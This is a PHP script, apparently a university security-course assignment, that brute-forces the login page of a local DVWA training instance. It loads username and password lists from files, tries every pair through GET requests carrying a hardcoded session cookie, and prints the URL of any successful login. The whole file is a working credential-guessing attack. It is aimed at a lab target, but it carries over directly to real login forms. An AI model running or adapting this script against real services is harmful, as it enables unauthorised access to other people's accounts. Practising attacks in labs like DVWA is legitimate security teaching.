<?php

/*
 * Implementación practica ataque fuerza bruta, taller aplicación DVWA 02/09/2018
 * Especialización en ingeniería de software
 * Electiva buenas practicas y seguridad
 * Presentado por: 
 * - Alejandro Paez
 * - Mauricio Nuñez 
 * - Nelson Patiño
 * 
 * Observaciones: En método setRequest() tener en cuenta el cambio de  PHPSESSID y adecuación de la url
 * 
 */

class FuerzaBruta {

    private $url;
    private $opciones;
    private $context;
    private $usuarios;
    private $contrasenas;

    function __construct() {
        $this->usuarios = array();
        $this->contrasenas = array();
        $this->setUsuarios();
        $this->setContrasenas();
    }

    function setUsuarios() {
        /*
        $this->usuarios = array(
            '0' => 'myUser',
            '1' => 'user',
            '2' => 'admin',
            '3' => 'prueba'
        );
        */
        $archivo = fopen("archivoUsuarios", "r") or exit('No puede abrir archivo!');
        $i = 0;
        while(!feof($archivo)){            
            $this->usuarios[$i] = trim(fgets($archivo));
            $i++;
        }
        fclose($archivo);         
    }

    function setContrasenas() {
        /*
        $this->contrasenas = array(
            '0' => 'user',
            '1' => 'test',
            '2' => 'admin',
            '3' => 'prueba',
            '4' => 'password'
        );
        */
        $archivo = fopen("archivoContrasenas", "r") or exit('No puede abrir archivo!');
        $i = 0;
        while(!feof($archivo)){            
            $this->contrasenas[$i] = trim(fgets($archivo));
            $i++;
        }
        fclose($archivo);
    }

    function setRequest() {        
        $this->url = 'http://localhost:82/DVWA/vulnerabilities/brute/'; //docker-container
        //$this->url = 'http://localhost/DVWA/vulnerabilities/brute/'; //localhost

        $this->opciones = array(
            'http' => array(
                'method' => "GET",
                'header' => "Accept-language: en-US,en;q=0.9\r\n" . "Cookie: security=low; security=low; PHPSESSID=h9qg70rvcig84nq3gepahdq375\r\n"                
            )
        );
        $this->context = stream_context_create($this->opciones);
    }

    function getContentenidoResponse() {
        foreach ($this->usuarios as $usuario) {
            foreach ($this->contrasenas as $contrasena) {
                $urlPrueba = $this->url . '?username=' . $usuario . '&password=' . $contrasena . '&Login=Login';
                $contenidoResponse = file_get_contents($urlPrueba, false, $this->context);
                //echo $contenidoResponse;
                echo ' <br>';
                if(strpos($contenidoResponse, 'Welcome to the password protected area admin')){
                    echo utf8_encode( 'Éxito con url  = ' . $urlPrueba );                     
                }
                else{
                    echo utf8_encode( 'Error url = '); // . $urlPrueba;
                }                
            }
        }
    }

}

$fuerzaBruta = new FuerzaBruta();
$fuerzaBruta->setRequest();
$fuerzaBruta->getContentenidoResponse();
